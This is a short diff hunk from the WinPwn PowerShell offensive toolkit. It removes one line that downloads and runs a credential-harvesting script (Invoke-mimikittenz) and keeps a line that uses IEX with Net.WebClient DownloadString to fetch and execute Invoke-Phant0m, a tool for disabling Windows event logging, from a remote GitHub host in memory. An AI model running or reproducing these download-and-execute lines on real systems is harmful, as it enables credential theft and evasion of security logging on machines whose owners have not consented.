@@ -1251,7 +1251,6 @@ function WinPwn
     Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
     
     dependencychecks        
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-mimikittenz.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Phant0m.ps1')
       
     if (isadmin)
